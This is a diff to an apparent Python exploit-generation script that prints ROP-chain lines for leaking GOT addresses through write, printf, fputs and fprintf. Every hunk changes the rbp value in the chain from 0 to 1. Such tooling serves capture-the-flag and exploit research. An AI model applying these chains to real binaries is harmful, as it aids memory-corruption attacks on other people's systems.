@@ -42,7 +42,7 @@ if "write" in binary.got:
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
-    print "rop += p64(0) # rbp"
+    print "rop += p64(1) # rbp"
     print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
     print "rop += p64(8) # r13 [sizeof void*]"
     if to_leak == None:
@@ -88,7 +88,7 @@ elif "printf" in binary.got:
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
-    print "rop += p64(0) # rbp"
+    print "rop += p64(1) # rbp"
     print "rop += p64(0x%x) # r12 [printf@got]" % binary.got["printf"]
     print "rop += p64(0) # r13"
     print "rop += p64(0) # r14"
@@ -111,7 +111,7 @@ elif "__printf_chk" in binary.got:
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
-    print "rop += p64(0) # rbp"
+    print "rop += p64(1) # rbp"
     print "rop += p64(0x%x) # r12 [__printf_chk@got]" % binary.got["__printf_chk"]
     print "rop += p64(0) # r13"
     if to_leak == None:
@@ -135,7 +135,7 @@ elif "stdout" in binary.symbols:
         print "rop = ''"
         print "rop += p64(0x%x) # gadget 1" % gadget1
         print "rop += p64(0) # rbx"
-        print "rop += p64(0) # rbp"
+        print "rop += p64(1) # rbp"
         print "rop += p64(0x%x) # r12 [fputs@got]" % binary.got["fputs"]
         print "rop += p64(0) # r13"
         print "rop += p64(0x%x) # r14 [stdout]" % binary.symbols["stdout"]
@@ -158,7 +158,7 @@ elif "stdout" in binary.symbols:
         print "rop = ''"
         print "rop += p64(0x%x) # gadget 1" % gadget1
         print "rop += p64(0) # rbx"
-        print "rop += p64(0) # rbp"
+        print "rop += p64(1) # rbp"
         print "rop += p64(0x%x) # r12 [_fputs_unlocked@got]" % binary.got["_fputs_unlocked"]
         print "rop += p64(0) # r13"
         print "rop += p64(0x%x) # r14 [stdout]" % binary.symbols["stdout"]
@@ -181,7 +181,7 @@ elif "stdout" in binary.symbols:
         print "rop = ''"
         print "rop += p64(0x%x) # gadget 1" % gadget1
         print "rop += p64(0) # rbx"
-        print "rop += p64(0) # rbp"
+        print "rop += p64(1) # rbp"
         print "rop += p64(0x%x) # r12 [fprintf@got]" % binary.got["fprintf"]
         print "rop += p64(0) # r13"
         if to_leak == None:
@@ -204,7 +204,7 @@ elif "stdout" in binary.symbols:
         print "rop = ''"
         print "rop += p64(0x%x) # gadget 1" % gadget1
         print "rop += p64(0) # rbx"
-        print "rop += p64(0) # rbp"
+        print "rop += p64(1) # rbp"
         print "rop += p64(0x%x) # r12 [__fprintf_chk@got]" % binary.got["__fprintf_chk"]
         if to_leak == None:
             print "rop += p64(0x%x) # r13 [__fprintf_chk@got]" % binary.got["__fprintf_chk"]
